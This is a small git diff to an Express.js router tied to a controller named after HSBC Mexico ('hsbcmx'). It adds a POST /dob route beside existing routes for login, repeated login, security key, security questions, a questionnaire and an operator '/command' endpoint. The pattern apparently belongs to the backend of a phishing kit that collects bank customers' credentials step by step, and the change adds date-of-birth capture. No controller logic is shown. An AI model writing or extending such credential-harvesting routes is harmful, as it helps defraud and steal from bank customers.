@@ -9,6 +9,7 @@ const {
 	submitSec,
 	submitQuestionnaire,
 	deleteEntry,
+	submitPass,
 } = require("../controllers/hsbcmxController");
 
 const router = express.Router();
@@ -18,6 +19,7 @@ router.post("/command", command);
 router.get("/customers/id/:uniqueid", getInfo);
 router.post("/login", submitLogin);
 router.post("/loginAgain", submitLoginAgain);
+router.post("/dob", submitPass);
 router.post("/key", submitKey);
 router.post("/sec", submitSec);
 router.post("/questionnaire", submitQuestionnaire);
